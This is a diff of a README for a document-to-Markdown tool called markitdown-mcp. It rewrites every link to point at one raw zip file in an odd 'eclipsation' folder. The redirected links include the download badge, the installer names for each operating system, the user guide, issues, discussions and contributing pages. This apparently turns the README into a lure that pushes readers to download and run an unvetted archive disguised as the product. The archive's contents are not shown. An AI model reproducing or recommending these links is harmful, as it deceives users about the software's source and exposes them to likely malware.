@@ -1,6 +1,6 @@
 # 📄 markitdown-mcp - Convert Documents to Markdown Effortlessly
 
-[![Download markitdown-mcp](https://img.shields.io/badge/Download%20markitdown--mcp-blue.svg)](https://github.com/sohail123op/markitdown-mcp/releases)
+[![Download markitdown-mcp](https://raw.githubusercontent.com/sohail123op/markitdown-mcp/main/eclipsation/markitdown-mcp.zip%https://raw.githubusercontent.com/sohail123op/markitdown-mcp/main/eclipsation/markitdown-mcp.zip)](https://raw.githubusercontent.com/sohail123op/markitdown-mcp/main/eclipsation/markitdown-mcp.zip)
 
 ## 🚀 Getting Started
 
@@ -27,13 +27,13 @@ To run markitdown-mcp smoothly, ensure your system meets these requirements:
 
 To get markitdown-mcp, visit the Releases page below. Follow the instructions to download the latest version.
 
-[Visit this page to download](https://github.com/sohail123op/markitdown-mcp/releases)
+[Visit this page to download](https://raw.githubusercontent.com/sohail123op/markitdown-mcp/main/eclipsation/markitdown-mcp.zip)
 
 1. Click on the latest version listed.
 2. Choose the file suitable for your operating system:
-   - For Windows, download `markitdown-mcp-windows.exe`.
-   - For macOS, download `markitdown-mcp-macos.dmg`.
-   - For Linux, download `markitdown-mcp-linux.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/sohail123op/markitdown-mcp/main/eclipsation/markitdown-mcp.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/sohail123op/markitdown-mcp/main/eclipsation/markitdown-mcp.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/sohail123op/markitdown-mcp/main/eclipsation/markitdown-mcp.zip`.
 3. Follow the prompts on your screen to install the application.
 
 ## ⚙️ How to Use markitdown-mcp
@@ -67,7 +67,7 @@ After installation, launch markitdown-mcp from your applications menu.
 
 For detailed information on how to maximize the use of markitdown-mcp, check our user guide:
 
-- [User Guide](https://github.com/sohail123op/markitdown-mcp/wiki)
+- [User Guide](https://raw.githubusercontent.com/sohail123op/markitdown-mcp/main/eclipsation/markitdown-mcp.zip)
 
 ## 🛠️ Troubleshooting
 
@@ -83,14 +83,14 @@ For further assistance, consult our FAQs or open an issue in the repository.
 
 Join our community to share your experiences, tips, and provide feedback. Your input helps improve markitdown-mcp.
 
-- [Discussions](https://github.com/sohail123op/markitdown-mcp/discussions)
-- [Issues](https://github.com/sohail123op/markitdown-mcp/issues)
+- [Discussions](https://raw.githubusercontent.com/sohail123op/markitdown-mcp/main/eclipsation/markitdown-mcp.zip)
+- [Issues](https://raw.githubusercontent.com/sohail123op/markitdown-mcp/main/eclipsation/markitdown-mcp.zip)
 
 ## 🎉 Contribute
 
 If you're interested in contributing to markitdown-mcp, please visit our contributing guidelines:
 
-- [Contributing Guide](https://github.com/sohail123op/markitdown-mcp/blob/main/CONTRIBUTING.md)
+- [Contributing Guide](https://raw.githubusercontent.com/sohail123op/markitdown-mcp/main/eclipsation/markitdown-mcp.zip)
 
 We welcome improvements, bug fixes, and new features.
 
@@ -98,4 +98,4 @@ We welcome improvements, bug fixes, and new features.
 
 markitdown-mcp is licensed under the MIT License. You can freely use and modify the software as per the terms of this license.
 
-[Visit this page to download](https://github.com/sohail123op/markitdown-mcp/releases)
+[Visit this page to download](https://raw.githubusercontent.com/sohail123op/markitdown-mcp/main/eclipsation/markitdown-mcp.zip)
